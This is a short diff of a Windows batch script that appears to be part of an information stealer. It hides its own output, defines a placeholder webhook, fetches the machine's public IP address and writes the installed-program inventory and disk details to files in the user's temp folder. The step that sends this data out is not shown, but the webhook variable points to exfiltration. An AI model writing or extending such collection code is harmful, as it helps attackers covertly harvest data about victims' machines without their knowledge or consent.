@@ -1,8 +1,8 @@
-@echo on
+@echo off
+cd /D "%~dp0%"
 set webhook=YOUR_WEBHOOK_HERE
 curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
 timeout 2 > nul
-@echo off
 powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table" > %userprofile%\AppData\Local\Temp\programms.txt
 echo Hard Drive Space: > %userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic diskdrive get size >> %userprofile%\AppData\Local\Temp\System_INFO.txt
